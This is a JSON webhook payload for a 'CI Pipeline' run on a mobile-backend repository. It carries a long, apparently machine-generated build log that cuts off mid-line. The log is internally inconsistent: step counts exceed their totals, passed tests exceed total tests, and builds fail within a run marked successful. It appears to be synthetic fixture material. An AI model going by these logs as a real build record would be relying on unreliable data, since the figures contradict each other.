{
  "action": "completed",
  "workflow_run": {
    "id": 201,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "bbbd3e9b19ff98ec44d832cb3452a398ee6bd6c8",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-13T12:46:16.646231Z",
    "updated_at": "2025-12-13T12:47:40.980571Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_production ===\nStep 11/17: Testing\n[12:46:16] DEBUG: Memory usage: 812MB\nnpm notice: package.json updated\nUsing Node.js 19.1.5\n\u2713 package completed\nGET /status - 200 (44ms)\nUploading artifact 'dist' (27 files)\nCompiling utils/handler.rs...\nStep 2/24: Running migrations\n[12:46:16] INFO: Starting build process\nnpm notice: created a lockfile\nEnvironment: development\nImage pulled successfully\n[12:46:16] WARN: Deprecated API usage\npip: Downloading express-2.7.tar.gz\nUsing Node.js 16.1.5\n\u2713 All checks passed\nCache hit for key-1575\nCompiling lib/main.py...\nnpm install: resolved 852 packages\nCompiling utils/app.ts...\nStep 8/18: Deploying\n[12:46:16] WARN: Deprecated API usage\nMinifying main.js\nFinished.\nFetching submodules...\nBundling runtime.js\nOK\nPlatform: win32-x64\nWARNING: lodash has known vulnerabilities\n\u2713 deploy completed\nCache restored successfully (270MB)\nVerifying...\n[12:46:16] WARN: Deprecated API usage\nVerifying...\nMinifying vendor.js\nConnection established\nPOST /api - 202 (490ms)\n  PASS: test_auth_login (404ms)\nArtifact downloaded: 25MB\n\u2713 Task completed in 4634ms\nPulling image: alpine:latest\nChecking out master branch\nAlready up to date.\n[12:46:16] DEBUG: Initializing service\nnpm notice: created a lockfile\nCompleted.\n[12:46:16] DEBUG: Query executed in 11ms\nOK\nyarn add: Done in 10.71s\nFetching from https://docker.io/package.json\npip: Collecting lodash\nTLS handshake completed\nInstalling jest@4.2.0\nArtifact uploaded: dist.zip (11MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching submodules...\nCoverage: 85% statements, 72% branches\n  PASS: integration/test_api_health.spec.js\n  PASS: unit/test_api_health.spec.js\nOptimizing 92 modules...\nSwitched to branch 'bugfix/task-413'\nGenerating source maps...\nArtifact uploaded: build.tar.gz (16MB)\nUsing Python 3.10\n[12:46:16] ERROR: Connection failed\n\u2713 Task completed in 3256ms\n[12:46:16] WARN: Deprecated API usage\nStep 10/21: Linting\nCompiling components/handler.rs...\nCache hit for key-9158\n[12:46:16] INFO: Starting build process\n[12:46:16] WARN: Deprecated API usage\nnpm install: added 355 packages\nFetching submodules...\nConnection established\nChecking out main branch\nWaiting...\nProcessing...\n[12:46:16] INFO: Cache refreshed\nnpm notice: package.json updated\nReady.\nImage pulled successfully\nTLS handshake completed\nnpm notice: created a lockfile\nCompiling components/service.java...\nnpm install: added 47 packages\nnpm install: added 371 packages\n[12:46:16] INFO: Request completed\n[12:46:16] WARN: Deprecated API usage\nUsing Node.js 18.5.4\n[12:46:16] INFO: Cache refreshed\n[12:46:16] DEBUG: Connection pool: 8 active\nBundling vendor.css\n[12:46:16] INFO: Connecting to database\n[12:46:16] INFO: Processing request\nFAILED: test_auth_login\nCache invalidated: node_modules\nGenerating source maps...\nCache saved successfully\nWARNING: prettier has known vulnerabilities\nCompiling utils/handler.rs...\npip: Downloading lodash-4.11.tar.gz\n[12:46:16] WARN: Deprecated API usage\nArtifact downloaded: 19MB\nCompiling src/index.js...\nnpm install: added 252 packages\nTransforming 704 files...\nCache invalidated: dependencies\n[12:46:16] INFO: Connecting to database\n  PASS: test_api_health (125ms)\nUsing Python 3.11\n  PASS: test_auth_login (290ms)\nCompiling lib/utils.go...\nStep 13/18: Building\nStep 12/23: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 30 passed, 19 total\nCoverage: 75% statements, 89% branches\nnpm install: added 316 packages\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 2/21: Testing\nPlatform: linux-x64\nPOST /api - 202 (470ms)\nCache hit for key-4584\nEnvironment: test\nMinifying main.js\nBuilding Docker image...\nStep 9/15: Running migrations\nStep 3/18: Running migrations\nLayer 3/12: ENV command\nCompleted.\n=== Step deploy_production completed ===\n=== Step: type_check ===\nCache saved successfully\n[12:46:16] DEBUG: Loading configuration\nSuccess!\nException: ValueError\nCache hit for key-2035\nDone.\nSwitched to branch 'bugfix/task-223'\nPushing to registry...\nFinished.\nLoading...\n[12:46:16] DEBUG: Query executed in 24ms\nnpm install: resolved 846 packages\nArtifact uploaded: build.tar.gz (48MB)\n[12:46:16] DEBUG: Connection pool: 12 active\n[12:46:16] DEBUG: Memory usage: 737MB\nSwitched to branch 'feature/task-940'\nUsing Python 3.9\nOK\nCache saved successfully\nConnection established\nHEAD is now at 728b244\nWaiting...\n[12:46:16] DEBUG: Query executed in 99ms\nBundling main.js\nStep 3/22: Building\nUsing Python 3.9\nRan 193 tests in 23s\nBundling vendor.js\nCompiling lib/handler.rs...\nReady.\n[12:46:16] WARN: Deprecated API usage\n  PASS: test_db_connect (134ms)\nUsing Python 3.11\nException: ValueError\nStep 10/19: Testing\n[12:46:16] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nConnection established\nStep 7/18: Deploying\nImage pulled successfully\nnpm install: added 120 packages\nRan 70 tests in 42s\n[12:46:16] WARN: Deprecated API usage\n[12:46:16] WARN: Deprecated API usage\nPulling image: python:3.11\nCoverage: 75% statements, 79% branches\nOK\n  PASS: integration/test_auth_login.spec.js\nBundling styles.js\nPulling image: python:latest\nBundling main.css\nImage pulled successfully\nCache hit for key-1878\nCoverage: 89% statements, 66% branches\n\u2713 Task completed in 4318ms\nTests: 156 passed, 470 total\nnpm install: resolved 223 packages\n[12:46:16] DEBUG: Loading configuration\nCreating production build...\nFetching from https://googleapis.com/package.json\nGET /api - 201 (85ms)\n[12:46:16] DEBUG: Loading configuration\nAlready up to date.\n[12:46:16] DEBUG: Connection pool: 1 active\nGET /status - 200 (25ms)\nnpm notice: created a lockfile\nCache miss for key-3818\nOK\npip: Collecting express\nGET /status - 201 (100ms)\nLayer 4/8: COPY command\nCompleted.\n[12:46:16] WARN: Deprecated API usage\n[12:46:16] INFO: Cache refreshed\nGenerating source maps...\nArtifact downloaded: 31MB\nNODE_ENV=development\n[12:46:16] WARN: Deprecated API usage\nStep 20/19: Running migrations\nInstalling eslint@4.9.3\nCompiling components/service.java...\nBundling main.css\nCompiling utils/utils.go...\n[12:46:16] DEBUG: Initializing service\nStep 9/15: Testing\nTest Suites: 24 passed, 43 total\n[12:46:16] WARN: Deprecated API usage\n\u2717 build failed with exit code 64\n[12:46:16] INFO: Connecting to database\nAlready up to date.\nVerifying...\nTime: 41.737s\nUsing Python 3.10\nUploading artifact 'build' (46 files)\nCache restored successfully (207MB)\nWaiting...\nOK\n  PASS: test_auth_login (259ms)\nLoading...\nSnapshots: 36 passed, 29 total\nHEAD is now at f27ebcf\nStep 17/15: Building\n\u2713 Step 'build' succeeded\nnpm install: added 217 packages\n\u2717 build failed with exit code 102\nChecking out master branch\nCache restored successfully (245MB)\nCache miss for key-1590\nArtifact uploaded: build.tar.gz (3MB)\n[12:46:16] INFO: Request completed\nBuilding Docker image...\n[12:46:16] DEBUG: Query executed in 39ms\n\u2713 All checks passed\nTime: 40.831s\n[12:46:16] DEBUG: Connection pool: 14 active\nDone.\nPOST /data - 201 (155ms)\nFinished.\nCache restored successfully (194MB)\nTime: 75.483s\nCompiling utils/handler.rs...\nPOST /data - 202 (116ms)\nSnapshots: 37 passed, 3 total\nCache miss for key-7151\nWARNING: axios has known vulnerabilities\nnpm notice: created a lockfile\nAlready up to date.\nRan 140 tests in 2s\nRan 153 tests in 27s\nCache saved successfully\n[12:46:16] INFO: Starting build process\nnpm notice: package.json updated\n=== Step type_check completed ===\n=== Step: restore_cache ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'install' succeeded\nFetching submodules...\n[12:46:16] DEBUG: Connection pool: 20 active\nCache invalidated: build\nCompiling utils/index.js...\n[12:46:16] INFO: Starting build process\nStep 3/21: Testing\n[12:46:16] DEBUG: Connection pool: 2 active\nStep 5/18: Deploying\nCache restored successfully (383MB)\n\u2717 build failed with exit code 48\nDone.\n[12:46:16] INFO: Connecting to database\nStep 3/25: Installing dependencies\nUsing Node.js 18.9.10\nFinished.\nStep 5/21: Running migrations\nTests: 317 passed, 422 total\nReady.\nyarn add: Done in 21.95s\nCache saved successfully\n[12:46:16] WARN: Deprecated API usage\n[12:46:16] WARN: Deprecated API usage\n  PASS: integration/test_user_create.spec.js\nStep 10/16: Installing dependencies\nTLS handshake completed\nWaiting...\n[12:46:16] INFO: Connecting to database\n\u2717 build failed with exit code 123\nWARNING: prettier has known vulnerabilities\nnpm install: added 471 packages\nCompiling src/handler.rs...\nWaiting...\n[12:46:16] DEBUG: Connection pool: 3 active\nGET /api - 200 (60ms)\n[12:46:16] ERROR: Connection failed\n[12:46:16] DEBUG: Query executed in 60ms\nPushing to registry...\nDone.\nStep 19/19: Deploying\n[12:46:16] INFO: Processing request\nCache saved successfully\npip: Collecting eslint\nGenerating source maps...\nCoverage: 73% statements, 86% branches\npip: Collecting prettier\n[12:46:16] WARN: Deprecated API usage\nOptimizing 13 modules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 33 passed, 48 total\nyarn add: Done in 27.12s\nStep 11/19: Building\nVerifying...\n[12:46:16] WARN: Deprecated API usage\nTest Suites: 13 passed, 47 total\nCache miss for key-1670\nException: RuntimeError\nPulling image: node:3.11\nWARNING: react has known vulnerabilities\nWARNING: react has known vulnerabilities\nnpm notice: created a lockfile\nCreating production build...\nStep 1/23: Installing dependencies\npip: Installing build dependencies...\nBundling main.css\n\u2713 Task completed in 263ms\nnpm notice: package.json updated\n[12:46:16] DEBUG: Memory usage: 560MB\nTests: 206 passed, 112 total\nChecking out main branch\nFinished.\npip install: Successfully installed axios-2.5\nWARNING: lodash has known vulnerabilities\nFetching from https://pypi.org/package.json\nnpm install: resolved 146 packages\nBundling runtime.css\nHEAD is now at c5d8dc5\nWARNING: jest has known vulnerabilities\nWARNING: axios has known vulnerabilities\nHEAD is now at b76c270\nStep 15/20: Linting\nFetching submodules...\nnpm install: added 88 packages\nTime: 117.605s\nnpm notice: created a lockfile\nPushing to registry...\nTest Suites: 17 passed, 41 total\nPOST /data - 202 (355ms)\nSuccess!\nStep 15/21: Running migrations\nCompiling src/utils.go...\n[12:46:16] INFO: Connecting to database\nPulling image: alpine:18\nArtifact downloaded: 2MB\nCache miss for key-6282\nUsing Python 3.9\nHEAD is now at d5fbbb2\nVerifying...\nImage pulled successfully\nRan 86 tests in 12s\nNODE_ENV=development\nArtifact downloaded: 12MB\nLayer 9/8: COPY command\nBuilding Docker image...\nWARNING: eslint has known vulnerabilities\n[12:46:16] DEBUG: Memory usage: 1729MB\nCompiling lib/utils.go...\npip: Installing build dependencies...\nProcessing...\nWaiting...\nCompiling src/service.java...\n\u2713 test completed\n[12:46:16] DEBUG: Memory usage: 1535MB\nStep 1/22: Linting\nLayer 9/14: COPY command\nStep 3/19: Building\nStep 12/22: Deploying\nWARNING: lodash has known vulnerabilities\n[12:46:16] INFO: Processing request\nNODE_ENV=development\nCoverage: 74% statements, 75% branches\nStep 19/16: Deploying\n  PASS: e2e/test_auth_login.spec.js\nnpm notice: created a lockfile\nStep 9/21: Installing dependencies\nTests: 174 passed, 181 total\nCache miss for key-8225\npip: Downloading eslint-2.17.tar.gz\n\u2713 Task completed in 1099ms\nCache miss for key-1325\nFetching submodules...\npip: Collecting lodash\n=== Step restore_cache completed ===\n=== Step: setup_node ===\n\u2713 Task completed in 3499ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:16] DEBUG: Memory usage: 1006MB\nArtifact downloaded: 29MB\nStep 12/23: Building\nLayer 9/8: RUN command\nDone.\n\u2713 build completed\nImage pulled successfully\nImage pulled successfully\nFetching from https://googleapis.com/package.json\nCache saved successfully\n[12:46:16] INFO: Request completed\nOK\nReady.\nPOST /upload - 200 (429ms)\nFetching submodules...\n[12:46:16] INFO: Starting build process\nReady.\nProcessing...\nInstalling prettier@2.15.7\n[12:46:16] INFO: Processing request\nWARNING: react has known vulnerabilities\n[12:46:16] INFO: Request completed\npip: Downloading express-4.10.tar.gz\nCompiling utils/main.py...\nUsing Node.js 20.13.6\nBundling vendor.js\nSnapshots: 28 passed, 45 total\nStep 5/25: Building\n[12:46:16] INFO: Starting build process\npip: Downloading jest-3.8.tar.gz\n\u2713 Step 'setup' succeeded\nWARNING: lodash has known vulnerabilities\nSuccess!\nOptimizing 27 modules...\nnpm install: resolved 1692 packages\nnpm notice: package.json updated\n\u2713 test completed\nCache saved successfully\nVerifying...\nEnvironment: test\nWARNING: lodash has known vulnerabilities\nReady.\n[12:46:16] INFO: Cache refreshed\nPOST /api - 201 (383ms)\nVerifying...\nStep 16/20: Linting\nStep 8/21: Installing dependencies\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 22 tests in 29s\n[12:46:16] WARN: Deprecated API usage\n[12:46:16] INFO: Starting build process\nCompiling src/app.ts...\n[12:46:16] INFO: Processing request\nLoading...\nFetching submodules...\nFetching from https://npmjs.org/package.json\nNODE_ENV=development\nOptimizing 34 modules...\nStep 4/19: Installing dependencies\nnpm notice: created a lockfile\nCache restored successfully (99MB)\nnpm notice: package.json updated\nFAILED: test_auth_login\n[12:46:16] DEBUG: Memory usage: 1794MB\nImage pulled successfully\nOptimizing 39 modules...\nPlatform: linux-x64\npip install: Successfully installed express-4.13\nReady.\nCompiling utils/index.js...\nPulling image: node:18\nReady.\n[12:46:16] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (5MB)\nHEAD is now at 4dd5378\nStep 19/18: Running migrations\n[12:46:16] INFO: Cache refreshed\nCache restored successfully (393MB)\nStep 16/19: Deploying\nRan 200 tests in 39s\nCompiling utils/service.java...\nDone.\n[12:46:16] DEBUG: Loading configuration\nTransforming 632 files...\nChecking out main branch\nCompiling lib/utils.go...\nyarn add: Done in 2.90s\n[12:46:16] INFO: Connecting to database\nUsing Node.js 16.8.4\nNODE_ENV=test\npip install: Successfully installed express-3.1\nCompiling lib/handler.rs...\nTests: 241 passed, 94 total\nSuccess!\npip: Installing build dependencies...\nStep 3/19: Testing\nOptimizing 86 modules...\n[12:46:16] DEBUG: Memory usage: 1370MB\nCache saved successfully\n[12:46:16] ERROR: Connection failed\nnpm install: added 436 packages\n[12:46:16] DEBUG: Loading configuration\n[12:46:16] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:16] WARN: Deprecated API usage\nyarn add: Done in 24.87s\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache invalidated: node_modules\nWARNING: react has known vulnerabilities\nOptimizing 65 modules...\npip: Collecting express\nUsing Python 3.9\nStep 12/24: Installing dependencies\n[12:46:16] INFO: Request completed\nFinished.\nCompiling src/service.java...\nReady.\nStep 8/23: Testing\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: ValueError\n\u2713 All checks passed\nnpm notice: created a lockfile\n\u2713 Step 'checkout' succeeded\nTime: 113.220s\n[12:46:16] INFO: Connecting to database\n\u2713 Step 'test' succeeded\nCoverage: 87% statements, 77% branches\nBuilding Docker image...\nTests: 343 passed, 409 total\n=== Step setup_node completed ===\n=== Step: install_dependencies ===\nCache restored successfully (114MB)\nyarn add: Done in 17.86s\nFinished.\nFetching from https://github.com/package.json\nUsing Node.js 16.12.5\npip: Collecting lodash\nImage pulled successfully\nOptimizing 53 modules...\npip install: Successfully installed prettier-2.14\n[12:46:16] WARN: Deprecated API usage\n  PASS: test_cache_hit (65ms)\n\u2713 Task completed in 2811ms\nnpm notice: created a lockfile\n\u2713 Step 'checkout' succeeded\n[12:46:16] DEBUG: Query executed in 43ms\nReady.\n[12:46:16] WARN: Deprecated API usage\n[12:46:16] ERROR: Connection failed\nProcessing...\nDone.\nCompleted.\npip: Installing build dependencies...\nTest Suites: 21 passed, 40 total\nCache restored successfully (111MB)\n\u2713 deploy completed\nSnapshots: 27 passed, 22 total\nFAILED: test_cache_hit\npip: Collecting jest\n[12:46:16] ERROR: Connection failed\nEnvironment: development\npip: Installing build dependencies...\nImage pulled successfully\nPOST /upload - 202 (420ms)\nImage pulled successfully\nRan 157 tests in 4s\nStep 6/15: Deploying\nnpm install: resolved 1421 packages\nFAILED: test_auth_login\n[12:46:16] INFO: Starting build process\nDone.\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /data - 201 (399ms)\nSwitched to branch 'feature/task-847'\nOptimizing 12 modules...\nPushing to registry...\nDone.\nPlatform: darwin-arm64\n[12:46:16] INFO: Processing request\nFAILED: test_api_health\n[12:46:16] INFO: Cache refreshed\n[12:46:16] ERROR: Connection failed\npip: Collecting axios\nCache miss for key-2233\nyarn add: Done in 13.17s\nWaiting...\nProcessing...\nStep 14/16: Running migrations\nFinished.\n[12:46:16] DEBUG: Memory usage: 1475MB\nCoverage: 88% statements, 80% branches\nSwitched to branch 'feature/task-272'\n  PASS: e2e/test_user_create.spec.js\npip: Downloading jest-3.8.tar.gz\nnpm install: resolved 1094 packages\nOK\n[12:46:16] WARN: Deprecated API usage\nBundling runtime.js\n[12:46:16] INFO: Starting build process\nCompiling components/service.java...\nUsing Node.js 18.16.4\nnpm notice: created a lockfile\npip: Installing build dependencies...\nLoading...\n  PASS: integration/test_auth_login.spec.js\nWaiting...\n[12:46:16] DEBUG: Query executed in 55ms\n[12:46:16] INFO: Cache refreshed\nAlready up to date.\nUploading artifact 'dist' (42 files)\n[12:46:16] DEBUG: Connection pool: 7 active\n[12:46:16] DEBUG: Query executed in 81ms\npip: Collecting jest\nWARNING: express has known vulnerabilities\npip: Downloading webpack-2.5.tar.gz\n\u2713 Step 'install' succeeded\n\u2713 All checks passed\nArtifact uploaded: dist.zip (56MB)\nStep 15/16: Installing dependencies\nTests: 260 passed, 184 total\npip: Downloading react-5.2.tar.gz\nStep 13/25: Testing\nLayer 4/13: RUN command\n  PASS: test_api_health (205ms)\nSuccess!\nCompiling utils/handler.rs...\n\u2717 build failed with exit code 39\n\u2717 build failed with exit code 37\npip: Collecting express\nStep 13/20: Testing\nWARNING: axios has known vulnerabilities\nHEAD is now at 7686fed\n\u2713 Task completed in 3471ms\n[12:46:16] DEBUG: Connection pool: 11 active\npip: Collecting jest\nSwitched to branch 'feature/task-826'\nnpm install: resolved 1039 packages\nyarn add: Done in 15.46s\n\u2713 Task completed in 2161ms\nCreating production build...\nnpm notice: package.json updated\nOK\nCompiling utils/index.js...\nEnvironment: production\nFetching submodules...\n[12:46:16] DEBUG: Memory usage: 1846MB\nTime: 101.932s\n[12:46:16] WARN: Deprecated API usage\nMinifying main.js\n\u2713 Step 'checkout' succeeded\nFetching from https://gcr.io/package.json\nSwitched to branch 'hotfix/task-588'\nInstalling lodash@5.3.10\nFetching from https://github.com/package.json\nCache miss for key-8940\n[12:46:16] INFO: Cache refreshed\nArtifact downloaded: 14MB\nWaiting...\nDone.\nCoverage: 93% statements, 86% branches\n[12:46:16] DEBUG: Connection pool: 15 active\nPulling image: alpine:18\nWaiting...\n=== Step install_dependencies completed ===\n=== Step: build ===\nStep 1/23: Running migrations\nSwitched to branch 'hotfix/task-855'\nnpm notice: package.json updated\nEnvironment: production\nUsing Node.js 18.7.0\nEnvironment: staging\n\u2717 build failed with exit code 48\nnpm notice: package.json updated\n[12:46:16] DEBUG: Initializing service\nUploading artifact 'coverage' (44 files)\nArtifact downloaded: 17MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOK\npip: Installing build dependencies...\nCompiling src/service.java...\nHEAD is now at f281397\n[12:46:16] WARN: Deprecated API usage\n[12:46:16] DEBUG: Memory usage: 834MB\nRan 168 tests in 52s\nFinished.\nSuccess!\nTests: 59 passed, 483 total\nCreating production build...\nUploading artifact 'coverage' (2 files)\nWARNING: prettier has known vulnerabilities\nNODE_ENV=development\n  PASS: unit/test_user_create.spec.js\n[12:46:16] ERROR: Connection failed\nPlatform: linux-x64\n\u2713 All checks passed\n\u2713 Task completed in 893ms\nStep 4/21: Running migrations\nArtifact uploaded: dist.zip (74MB)\n  PASS: test_user_create (69ms)\nSuccess!\n[12:46:16] INFO: Processing request\nTLS handshake completed\nTLS handshake completed\nStep 9/21: Deploying\n  PASS: test_user_create (330ms)\nTests: 408 passed, 64 total\nPOST /upload - 202 (186ms)\nCompiling src/main.py...\nStep 2/24: Linting\nTest Suites: 15 passed, 28 total\nWARNING: express has known vulnerabilities\nPushing to registry...\n\u2713 All checks passed\n\u2713 test completed\nLoading...\npip: Collecting eslint\nnpm notice: package.json updated\nHEAD is now at b0a2136\nyarn add: Done in 22.92s\nSuccess!\nRan 151 tests in 50s\nPOST /upload - 201 (241ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nyarn add: Done in 11.87s\n[12:46:16] INFO: Connecting to database\npip install: Successfully installed express-4.11\nnpm notice: package.json updated\nPulling image: node:latest\nOK\n\u2713 Step 'test' succeeded\nCache hit for key-3709\nVerifying...\n\u2713 Step 'setup' succeeded\nStep 15/24: Linting\nCache hit for key-3270\nCache hit for key-5279\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 85% statements, 62% branches\nBundling styles.css\nWARNING: axios has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nFetching submodules...\n[12:46:16] INFO: Connecting to database\nCreating production build...\nTime: 16.116s\nDone.\npip install: Successfully installed eslint-3.10\nStep 10/15: Building\nVerifying...\nCompiling src/main.py...\n[12:46:16] WARN: Deprecated API usage\nGenerating source maps...\nSuccess!\nLoading...\nConnection established\nCache restored successfully (474MB)\n[12:46:16] DEBUG: Loading configuration\nConnection established\n[12:46:16] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nCompiling lib/index.js...\nnpm notice: package.json updated\n[12:46:16] DEBUG: Loading configuration\nCompiling src/index.js...\n[12:46:16] DEBUG: Loading configuration\nCreating production build...\n[12:46:16] DEBUG: Memory usage: 1431MB\nEnvironment: test\nUsing Node.js 16.20.2\nyarn add: Done in 8.54s\n[12:46:16] DEBUG: Initializing service\nNODE_ENV=test\nConnection established\nGenerating source maps...\nReady.\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nPlatform: linux-x64\nWaiting...\nPlatform: darwin-arm64\nStep 19/20: Testing\nCache miss for key-1429\nTests: 69 passed, 390 total\n[12:46:16] WARN: Deprecated API usage\nPOST /upload - 200 (141ms)\npip: Collecting webpack\nArtifact uploaded: dist.zip (47MB)\nSuccess!\nConnection established\npip: Collecting express\nCompiling src/utils.go...\nTest Suites: 49 passed, 8 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\nCompleted.\nGenerating source maps...\n[12:46:16] DEBUG: Query executed in 93ms\n=== Step build completed ===\n=== Step: checkout ===\nTransforming 928 files...\n\u2713 Step 'checkout' succeeded\nCache invalidated: dependencies\n[12:46:16] INFO: Request completed\nCache miss for key-2725\nArtifact downloaded: 49MB\n[12:46:16] INFO: Request completed\n[12:46:16] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching from https://githubusercontent.com/package.json\nCache invalidated: build\nLoading...\nnpm install: resolved 906 packages\n[12:46:16] INFO: Starting build process\n[12:46:16] WARN: Deprecated API usage\nCache saved successfully\n[12:46:16] DEBUG: Connection pool: 7 active\nCoverage: 86% statements, 87% branches\nWARNING: webpack has known vulnerabilities\nCoverage: 76% statements, 94% branches\nWARNING: webpack has known vulnerabilities\nVerifying...\nStep 19/15: Testing\nOK\nVerifying...\nTests: 234 passed, 428 total\nEnvironment: staging\nOK\n[12:46:16] INFO: Starting build process\nCache hit for key-5213\nConnection established\nGenerating source maps...\nLoading...\nCache restored successfully (233MB)\nGET /health - 200 (4ms)\n[12:46:16] DEBUG: Query executed in 90ms\nSwitched to branch 'bugfix/task-907'\n\u2713 Step 'checkout' succeeded\nGenerating source maps...\nHEAD is now at 19ef1a1\nWARNING: express has known vulnerabilities\nProcessing...\nPulling image: alpine:18\nCache restored successfully (377MB)\nTest Suites: 9 passed, 24 total\nOptimizing 25 modules...\nUsing Python 3.11\nLayer 3/9: RUN command\nSwitched to branch 'feature/task-345'\nReady.\nGET /status - 201 (72ms)\nCompiling components/app.ts...\nnpm notice: package.json updated\nEnvironment: test\npip install: Successfully installed express-2.13\n[12:46:16] WARN: Deprecated API usage\nStep 13/19: Linting\nSuccess!\nFetching submodules...\n[12:46:16] ERROR: Connection failed\nCache invalidated: dependencies\nnpm notice: package.json updated\npip: Installing build dependencies...\nnpm install: added 376 packages\nTests: 460 passed, 376 total\nNODE_ENV=development\nFetching submodules...\nGET /status - 200 (59ms)\nImage pulled successfully\nGenerating source maps...\nPOST /upload - 200 (460ms)\nAlready up to date.\nLayer 10/9: RUN command\nTests: 256 passed, 470 total\npip: Downloading express-1.14.tar.gz\nRan 15 tests in 37s\n  PASS: test_api_health (223ms)\n[12:46:16] INFO: Processing request\npip: Installing build dependencies...\nStep 18/16: Installing dependencies\nHEAD is now at 27977cc\nEnvironment: development\nCompiling lib/utils.go...\nFetching from https://github.com/package.json\npip: Collecting react\nHEAD is now at f64fc86\n[12:46:16] DEBUG: Memory usage: 531MB\n[12:46:16] DEBUG: Memory usage: 1972MB\nLayer 8/15: COPY command\npip: Installing build dependencies...\nEnvironment: development\nProcessing...\nArtifact uploaded: dist.zip (31MB)\nStep 15/17: Installing dependencies\nSwitched to branch 'hotfix/task-753'\nTransforming 314 files...\nArtifact uploaded: dist.zip (90MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 13/18: Building\nnpm notice: created a lockfile\nProcessing...\nnpm notice: package.json updated\nTLS handshake completed\nFinished.\nArtifact uploaded: dist.zip (100MB)\nyarn add: Done in 20.36s\n[12:46:16] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (30MB)\nProcessing...\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (28MB)\nPlatform: win32-x64\nCompiling utils/app.ts...\nStep 18/15: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\nCreating production build...\npip: Collecting express\nEnvironment: test\n[12:46:16] DEBUG: Loading configuration\nTLS handshake completed\nRan 101 tests in 23s\nUsing Python 3.10\nSwitched to branch 'feature/task-572'\n\u2713 Step 'build' succeeded\nTransforming 196 files...\n[12:46:16] INFO: Connecting to database\nWARNING: express has known vulnerabilities\nnpm notice: package.json updated\n\u2713 Step 'build' succeeded\nFAILED: test_api_health\nSuccess!\nCompiling src/app.ts...\n=== Step checkout completed ===\n=== Step: save_cache ===\n  PASS: integration/test_api_health.spec.js\nBundling runtime.css\nWARNING: axios has known vulnerabilities\nEnvironment: production\n[12:46:16] DEBUG: Connection pool: 14 active\nGenerating source maps...\nBundling main.js\nStep 19/16: Running migrations\nWARNING: axios has known vulnerabilities\nHEAD is now at 54d7ba7\nOK\nWARNING: express has known vulnerabilities\nStep 7/22: Installing dependencies\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 2/24: Linting\nPushing to registry...\n[12:46:16] INFO: Request completed\n[12:46:16] DEBUG: Query executed in 21ms\nWARNING: express has known vulnerabilities\nTests: 444 passed, 64 total\nnpm install: resolved 750 packages\nStep 1/22: Running migrations\npip: Installing build dependencies...\nCompiling utils/handler.rs...\nFetching submodules...\n[12:46:16] DEBUG: Query executed in 27ms\nTransforming 550 files...\nDone.\nTests: 239 passed, 454 total\nUsing Python 3.12\n[12:46:16] INFO: Connecting to database\nGET /status - 201 (62ms)\nWaiting...\n\u2717 build failed with exit code 9\nRan 126 tests in 42s\nArtifact uploaded: build.tar.gz (11MB)\nArtifact downloaded: 12MB\nInstalling eslint@4.6.8\nPushing to registry...\nTLS handshake completed\nCache invalidated: dependencies\nCache hit for key-4686\nSwitched to branch 'hotfix/task-114'\n[12:46:16] INFO: Connecting to database\n[12:46:16] INFO: Request completed\nConnection established\nSnapshots: 42 passed, 21 total\n[12:46:16] DEBUG: Connection pool: 19 active\nCache miss for key-2466\n  PASS: e2e/test_user_create.spec.js\n[12:46:16] WARN: Deprecated API usage\nSuccess!\n[12:46:16] WARN: Deprecated API usage\n[12:46:16] DEBUG: Connection pool: 2 active\nStep 6/17: Installing dependencies\nMinifying vendor.js\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: created a lockfile\n\u2713 All checks passed\nOptimizing 60 modules...\nStep 11/16: Linting\nGenerating source maps...\nConnection established\nStep 19/25: Linting\nOK\nStep 11/20: Linting\nVerifying...\n[12:46:16] INFO: Processing request\nCompleted.\n[12:46:16] INFO: Processing request\n[12:46:16] INFO: Request completed\nBuilding Docker image...\nCache restored successfully (483MB)\nStep 11/25: Building\nHEAD is now at fcd5bea\nnpm notice: created a lockfile\nStep 6/20: Testing\nFetching from https://docker.io/package.json\nTest Suites: 48 passed, 14 total\nTransforming 620 files...\nStep 12/22: Testing\nUploading artifact 'coverage' (16 files)\npip: Installing build dependencies...\nArtifact downloaded: 26MB\nCache invalidated: node_modules\n[12:46:16] INFO: Processing request\nImage pulled successfully\nImage pulled successfully\nCompiling components/app.ts...\n[12:46:16] INFO: Request completed\nCoverage: 93% statements, 80% branches\nUploading artifact 'coverage' (20 files)\npip: Collecting prettier\nFinished.\nUsing Python 3.11\nHEAD is now at 2d23526\nUsing Node.js 18.6.3\nSuccess!\n[12:46:16] DEBUG: Initializing service\nCompiling 